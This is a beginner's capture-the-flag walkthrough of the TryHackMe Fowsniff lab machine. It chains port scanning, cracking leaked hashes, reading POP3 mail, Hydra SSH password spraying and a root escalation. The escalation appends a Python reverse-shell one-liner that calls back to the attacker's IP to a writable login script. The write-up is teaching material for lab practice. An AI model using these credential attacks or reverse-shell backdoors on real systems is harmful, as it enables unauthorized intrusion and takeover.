---
title: "Fowsniff"
draft: false
date: 2025-08-22 01:09:33 +0300
description: A beginner-friendly Boot2Root machine from THM.
categories: ["THM", "TryHackMe", "NMAP", "POP3", "IMAP", "SSH", "Hash Cracking", "Hydra", "LinPEAS", "easy", "boot2root", "B2R", "OSINT", "Google Dorking"]
tags: ["THM", "TryHackMe", "NMAP", "POP3", "IMAP", "SSH", "Hash Cracking", "Hydra", "LinPEAS", "easy", "boot2root", "B2R", "OSINT", "Google Dorking", "Privilege Escalation", "Reverse Shell", "Email Enumeration"]
featureimage: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg1cKoR6tgXuXKI148RqMfXDvddGW_fAkhfw&s"
---

# Fowsniff CTF - Complete Beginner's Walkthrough

## What is This?
**Fowsniff** is a beginner-friendly boot2root CTF (Capture The Flag) challenge hosted on TryHackMe. In this challenge, we'll learn fundamental penetration testing skills by exploiting a vulnerable Linux machine to gain root access and capture the flag.

**What you'll learn:**
- Network scanning with Nmap
- Online research and Google dorking
- Hash cracking techniques
- Email protocol exploitation (POP3)
- SSH brute forcing
- Linux privilege escalation
- Reverse shell creation

## Prerequisites
- Basic Linux command line knowledge
- A TryHackMe account (free)
- Kali Linux or similar penetration testing environment
- Basic understanding of IP addresses and ports


## Lab Setup
### Starting the Machine
1. Log into your TryHackMe account
2. Navigate to the Fowsniff CTF room
3. Click "Start Machine" and wait for it to deploy
4. Note the IP address assigned to your target machine (we'll use `10.10.4.101` in this example)


## Phase 1: Reconnaissance & Enumeration

### What is Reconnaissance?
Reconnaissance (or "recon") is the process of gathering information about our target. We want to find:
- What services are running?
- What ports are open?
- What software versions are installed?
- Any publicly available information about the target?

### Step 1: Network Scanning with Nmap

**What is Nmap?** Nmap (Network Mapper) is a tool that scans networks to discover hosts and services. It's like knocking on doors to see which ones are open.

Let's scan our target for open ports and services:

```bash
nmap -sV -p- 10.10.4.101 -T4
```

**Command breakdown:**
- `nmap` - The network scanning tool
- `-sV` - Version detection (tells us what software is running)
- `-p-` - Scan all 65,535 ports (not just common ones)
- `10.10.4.101` - Our target IP address
- `-T4` - Timing template (faster scanning)

**Output:**
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 03:31 BST
Nmap scan report for ip-10-10-4-101.eu-west-1.compute.internal (10.10.4.101)
Host is up (0.00044s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
MAC Address: 02:F8:7E:ED:14:65 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
```

**What we discovered:**
- **Port 22 (SSH)** - Secure Shell for remote login
- **Port 80 (HTTP)** - Web server running Apache
- **Port 110 (POP3)** - Email retrieval protocol
- **Port 143 (IMAP)** - Another email protocol
- **Operating System:** Ubuntu Linux

### Step 2: Web Application Investigation

Let's check the website first. Open a web browser and navigate to:
```
http://10.10.4.101
```

You should see a website that appears to be temporarily unavailable or under maintenance.

**What is Directory Fuzzing?** Sometimes websites have hidden directories that aren't linked from the main page. We can try to find these using a technique called "fuzzing" - essentially guessing common directory names.

Let's try directory fuzzing (this won't find much, but it's good practice):
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.101/FUZZ
```

**Command breakdown:**
- `ffuf` - Fast web fuzzer
- `-w` - Wordlist to use for fuzzing
- `-u` - URL pattern (FUZZ gets replaced with words from the wordlist)

*Note: If you don't have ffuf installed, install it with: `sudo apt install ffuf`*

## Phase 2: OSINT (Open Source Intelligence)

### What is OSINT?
OSINT involves gathering information from publicly available sources. Sometimes, information about our target is already available online!

### Step 3: Google Dorking Discovery

Since the website seems to be down for maintenance, let's try searching online for information about "Fowsniff" or the company.

**What is Google Dorking?** Google dorking uses special search operators to find specific information that might not appear in normal searches.

In a real scenario, you might search for:
- Company name + "password"
- Company domain + "leak"
- Employee email addresses

For this CTF, the hint leads us to a GitHub repository: https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt

This simulates finding a data breach dump online. Let's examine what we found:

### Step 4: Analyzing the Password Dump

The GitHub link contains leaked user credentials in this format:
```
username@domain:password_hash
```

**Our discovered data:**
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

**What are these hashes?** The long strings after the colons are password hashes. Instead of storing passwords in plain text (which would be very insecure), systems store mathematical representations called "hashes."

### Step 5: Cracking Password Hashes

**What is Hash Cracking?** We need to reverse these hashes back to the original passwords. We can use online tools or offline tools like hashcat or john.

Let's use the online tool **CrackStation** (https://crackstation.net):

1. Copy all the hashes (the part after the colon)
2. Paste them into CrackStation
3. Solve the captcha and click "Crack Hashes"

**Our cracked credentials:**
```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:[not cracked]
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```

Let's save these in two files for later use:
```bash
# Create a usernames file
echo -e "mauer\nmustikka\ntegel\nbaksteen\nseina\nstone\nmursten\nparede\nsciana" > fowsniff_usernames.txt

# Create a passwords file  
echo -e "mailcall\nbilbo101\napples01\nskyler22\nscoobydoo2\ncarp4ever\norlando12\n07011972" > fowsniff_passwords.txt
```

## Phase 3: Email Protocol Exploitation

### What is POP3?
**POP3 (Post Office Protocol 3)** is an email protocol that allows email clients to retrieve emails from a mail server. Unlike IMAP, POP3 typically downloads emails to the client and removes them from the server.

Remember our Nmap scan found POP3 running on port 110. Let's try to access someone's email account!

### Step 6: Connecting to the POP3 Service

**What is Netcat?** Netcat (nc) is a networking utility that can connect to any port. It's like a Swiss Army knife for network connections.

Let's try connecting to the POP3 service with one of our cracked accounts:

```bash
nc 10.10.4.101 110
```

You should see:
```
+OK Welcome to the Fowsniff Corporate Mail Server!
```

Now let's try logging in as `seina` with password `scoobydoo2`:

```bash
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

Great! We're in. Let's see what emails are available:

```bash
LIST
+OK 2 messages:
1 1622
2 1280
.
```

This shows there are 2 emails. Let's read the first one:

```bash
RETR 1
```

**Important Email Content:**
```
Subject: URGENT! Security EVENT!
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

**Key Discovery:** We found a temporary SSH password: `S1ck3nBluff+secureshell`

Type `QUIT` to exit the POP3 session.

## Phase 4: SSH Access

### What is SSH?
**SSH (Secure Shell)** is a protocol for securely connecting to remote computers. It's like remote desktop, but command-line based.

### Step 7: Finding Who Still Uses the Default Password

The email mentioned that everyone should change their SSH password. Let's see who hasn't changed it yet using **Hydra**.

**What is Hydra?** Hydra is a brute-force tool that tries multiple username/password combinations against various services.

*Install Hydra if you don't have it:*
```bash
sudo apt install hydra
```

Let's test the default SSH password against all usernames:

```bash
hydra -L fowsniff_usernames.txt -p 'S1ck3nBluff+secureshell' ssh://10.10.4.101
```

**Command breakdown:**
- `hydra` - The brute force tool
- `-L` - File containing usernames to try
- `-p` - Single password to test (note the quotes due to special characters)
- `ssh://10.10.4.101` - Target service and IP

**Output:**
```bash
Hydra v9.0 (c) 2019 by van Hauser/THC
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://10.10.4.101:22/
[22][ssh] host: 10.10.4.101   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
```

Excellent! User `baksteen` hasn't changed their password yet.

### Step 8: SSH Connection

Let's connect via SSH:

```bash
ssh baksteen@10.10.4.101
```

Enter the password when prompted: `S1ck3nBluff+secureshell`

**SSH Session Output:**
```bash
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions

   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

baksteen@fowsniff:~$
```

We're in! Let's explore:

```bash
pwd
ls -la
```

**Output:**
```bash
/home/baksteen
total 20
drwxr-xr-x 4 baksteen baksteen 4096 Mar 13  2018 .
drwxr-xr-x 4 root     root     4096 Mar  9  2018 ..
-rw-r--r-- 1 baksteen baksteen  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 baksteen baksteen 3771 Sep  1  2015 .bashrc
drwx------ 2 baksteen baksteen 4096 Mar 13  2018 .cache
drwxr-xr-x 5 baksteen baksteen 4096 Mar 13  2018 Maildir
-rw-r--r-- 1 baksteen baksteen  655 May 16  2017 .profile
-rw-r--r-- 1 baksteen baksteen   78 Mar 13  2018 term.txt
```

Let's check the user flag:
```bash
cat term.txt
```

This isn't the main flag - we need to escalate to root privileges.

## Phase 5: Privilege Escalation

### What is Privilege Escalation?
**Privilege escalation** is the process of gaining higher-level permissions on a system. We currently have access as the user `baksteen`, but we want root access to get the final flag.

### Step 9: System Enumeration with LinPEAS

**What is LinPEAS?** LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for common privilege escalation vectors on Linux systems.

Let's download and run LinPEAS:

```bash
# Download LinPEAS to the target machine
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Make it executable
chmod +x linpeas.sh

# Run it
./linpeas.sh
```

*Alternative download method if curl doesn't work:*
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

**Key Finding from LinPEAS:**
```bash
Interesting GROUP writable files (not in Home) (max 200)
  Group users:
/opt/cube/cube.sh
```

This is interesting! Let's investigate this file.

### Step 10: Analyzing the Writable Script

```bash
ls -la /opt/cube/cube.sh
```

**Output:**
```bash
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
```

**Understanding File Permissions:**
- `rw-` (owner: parede) - Read and write permissions
- `rwx` (group: users) - Read, write, and execute permissions  
- `r--` (others) - Read only

**Why is this important?** 
1. We are part of the `users` group
2. The `users` group has write access to this script
3. This script likely runs with elevated privileges

Let's see what this script does:
```bash
cat /opt/cube/cube.sh
```

This script appears to generate the banner we saw when logging in via SSH. If it runs as root during login, we can modify it to give us a root shell!

### Step 11: Creating a Reverse Shell

**What is a Reverse Shell?** A reverse shell is when the target machine connects back to our attacking machine, giving us a command prompt. This is useful because:
1. It bypasses firewall restrictions
2. We can catch it with a simple listener
3. If the script runs as root, we get a root shell

First, let's set up a listener on our attacking machine (in a new terminal):

```bash
nc -lvnp 4444
```

**Command breakdown:**
- `nc` - Netcat
- `-l` - Listen mode
- `-v` - Verbose output
- `-n` - Don't resolve hostnames
- `-p 4444` - Listen on port 4444

Now, let's modify the script to include our reverse shell. We need to add a Python reverse shell to the script:

```bash
# First, let's backup the original script
cp /opt/cube/cube.sh /opt/cube/cube.sh.backup

# Add our reverse shell to the script (replace 10.9.x.x with YOUR IP)
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.9.x.x\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' >> /opt/cube/cube.sh
```

**To find your IP address (attacking machine):**
```bash
ip addr show tun0
# or
ifconfig tun0
```

Look for your TryHackMe VPN IP address (usually starts with 10.x.x.x).

### Step 12: Triggering the Reverse Shell

The script runs when someone logs in via SSH. Let's trigger it by opening a new SSH session to the same machine:

```bash
# In a new terminal, SSH again
ssh baksteen@10.10.4.101
```

**Check your netcat listener** - you should see a connection!

**Example successful connection:**
```bash
Listening on 0.0.0.0 4444
Connection received on 10.10.4.101 45944
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

Congratulations! You now have root access!

### Step 13: Capturing the Flag

```bash
# Find the flag
find / -name "flag.txt" 2>/dev/null
# or
ls /root
```

**Read the root flag:**
```bash
cat /root/flag.txt
```

**Flag Output:**
```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

## Summary and Key Learning Points

### What We Accomplished:
1. **Network enumeration** - Used Nmap to discover open services
2. **OSINT research** - Found leaked credentials online
3. **Hash cracking** - Converted password hashes to plaintext
4. **Email exploitation** - Accessed POP3 emails for sensitive information
5. **Brute force attack** - Used Hydra to find SSH credentials
6. **Privilege escalation** - Exploited writable system files
7. **Reverse shell** - Gained root access through script modification

### Security Lessons:
1. **Password reuse is dangerous** - The same passwords were used across multiple services
2. **Default passwords must be changed** - The temporary SSH password wasn't changed
3. **File permissions matter** - Group-writable system files are dangerous
4. **Information disclosure** - Sensitive information in emails can be exploited
5. **Data breaches have lasting impact** - Old breached credentials are still valuable

This CTF is an excellent introduction to penetration testing methodology and demonstrates how multiple small vulnerabilities can be chained together for complete system compromise.

Remember: Practice makes perfect! Try similar CTF challenges to reinforce these skills.
